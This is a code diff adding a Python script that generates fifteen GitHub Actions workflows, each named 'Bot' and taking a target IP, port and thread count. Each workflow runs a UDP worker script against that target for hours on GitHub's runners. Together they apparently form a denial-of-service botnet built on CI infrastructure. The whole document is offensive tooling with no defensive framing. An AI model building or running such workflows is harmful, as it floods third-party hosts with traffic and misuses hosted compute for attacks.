@@ -1,0 +1,37 @@
+# generate_workflows.py — একবার চালান
+import os
+os.makedirs(".github/workflows", exist_ok=True)
+
+for i in range(1, 16):
+    yaml = f"""name: Bot {i}
+on:
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        required: true
+      target_port:
+        required: true
+      threads:
+        required: true
+        default: '1000'
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - run: pip install -r requirements.txt
+      - run: python udp_worker.py
+        env:
+          TARGET_IP: ${{{{ github.event.inputs.target_ip }}}}
+          TARGET_PORT: ${{{{ github.event.inputs.target_port }}}}
+          THREADS: ${{{{ github.event.inputs.threads }}}}
+"""
+    with open(f".github/workflows/bot{i}.yml", "w") as f:
+        f.write(yaml)
+
+print("✅ 15 workflows created!")
